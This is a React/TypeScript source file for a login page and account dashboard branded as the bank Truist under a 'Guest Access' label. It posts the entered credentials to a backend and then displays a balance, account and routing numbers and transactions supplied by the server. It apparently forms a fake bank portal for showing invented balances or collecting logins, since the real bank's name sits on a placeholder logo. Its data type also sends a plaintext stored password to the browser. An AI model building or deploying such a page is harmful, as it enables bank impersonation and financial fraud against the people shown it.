import { useState } from 'react'
import { MantineProvider, createTheme, TextInput, PasswordInput, Button, Paper, Stack, Text, Alert } from '@mantine/core'
import { User, Lock, AlertCircle } from 'lucide-react'
import axios from 'axios'

const theme = createTheme({
  primaryColor: 'blue',
  fontFamily: '-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif',
})

interface GuestData {
  master: {
    login: string
    password: string
    holder_name: string
    account_name: string
    account_number: string
    routing_number: string
    email: string
    phone: string
    balance: number
  }
  transfers: any[]
  files: any[]
}

function App() {
  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')
  const [data, setData] = useState<GuestData | null>(null)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')
    try {
      const res = await axios.post('/api/guest/login', { login, password })
      if (res.data.success) {
        setData(res.data.data)
      } else {
        setError('Invalid credentials')
      }
    } catch (err: any) {
      setError(err.response?.data?.error || 'Connection error')
    } finally {
      setLoading(false)
    }
  }

  if (data) {
    return (
      <MantineProvider theme={theme}>
        <div className="min-h-screen bg-gray-100">
          {/* Header */}
          <header className="bg-white shadow-sm">
            <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-blue-600 rounded-lg" />
                <Text fw={700} size="lg">Truist</Text>
              </div>
            </div>
          </header>

          {/* Main Content */}
          <main className="max-w-7xl mx-auto px-4 py-6">
            <div className="bg-white rounded-xl shadow-sm p-6 mb-6">
              <h1 className="text-2xl font-semibold mb-2">Welcome, {data.master.holder_name}</h1>
              <p className="text-gray-500">{data.master.account_name || 'Checking Account'}</p>

              {/* Balance Card */}
              <div className="mt-6 p-6 bg-gradient-to-r from-blue-600 to-blue-700 rounded-xl text-white">
                <Text size="sm" className="opacity-80">Available Balance</Text>
                <Text size="3rem" fw={700} className="mt-1">
                  ${Number(data.master.balance).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </Text>
              </div>

              {/* Account Details */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
                <div>
                  <Text size="xs" c="dimmed" tt="uppercase">Account Number</Text>
                  <Text fw={500}>{data.master.account_number || '-'}</Text>
                </div>
                <div>
                  <Text size="xs" c="dimmed" tt="uppercase">Routing Number</Text>
                  <Text fw={500}>{data.master.routing_number || '-'}</Text>
                </div>
                <div>
                  <Text size="xs" c="dimmed" tt="uppercase">Email</Text>
                  <Text fw={500} size="sm">{data.master.email || '-'}</Text>
                </div>
                <div>
                  <Text size="xs" c="dimmed" tt="uppercase">Phone</Text>
                  <Text fw={500}>{data.master.phone || '-'}</Text>
                </div>
              </div>
            </div>

            {/* Recent Transactions */}
            <div className="bg-white rounded-xl shadow-sm p-6">
              <h2 className="text-lg font-semibold mb-4">Recent Transactions</h2>
              {data.transfers && data.transfers.length > 0 ? (
                <div className="space-y-3">
                  {data.transfers.slice(0, 10).map((t) => (
                    <div key={t.id} className="flex justify-between items-center py-3 border-b border-gray-100 last:border-0">
                      <div>
                        <Text fw={500}>{t.description || 'Transaction'}</Text>
                        <Text size="sm" c="dimmed">{t.transaction_date}</Text>
                      </div>
                      <Text fw={600} className={Number(t.amount) >= 0 ? 'text-green-600' : 'text-red-600'}>
                        {Number(t.amount) >= 0 ? '+' : ''}${Number(t.amount).toFixed(2)}
                      </Text>
                    </div>
                  ))}
                </div>
              ) : (
                <Text c="dimmed">No transactions</Text>
              )}
            </div>
          </main>
        </div>
      </MantineProvider>
    )
  }

  return (
    <MantineProvider theme={theme}>
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-slate-900 to-slate-800">
        <Paper shadow="xl" p="xl" w={420} className="bg-white rounded-xl">
          <form onSubmit={handleSubmit}>
            <Stack gap="md">
              <div className="flex items-center gap-3 mb-2">
                <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                  <svg viewBox="0 0 24 24" fill="white" className="w-6 h-6">
                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                  </svg>
                </div>
                <div>
                  <Text size="xl" fw={700}>Truist</Text>
                  <Text c="dimmed" size="xs">Guest Access</Text>
                </div>
              </div>

              {error && (
                <Alert icon={<AlertCircle size={16} />} color="red" variant="light">
                  {error}
                </Alert>
              )}

              <TextInput
                label="Login"
                placeholder="Enter your login"
                leftSection={<User size={16} />}
                value={login}
                onChange={(e) => setLogin(e.target.value)}
                required
              />

              <PasswordInput
                label="Password"
                placeholder="Enter your password"
                leftSection={<Lock size={16} />}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />

              <Button type="submit" fullWidth loading={loading} mt="md">
                Enter
              </Button>
            </Stack>
          </form>
        </Paper>
      </div>
    </MantineProvider>
  )
}

export default App
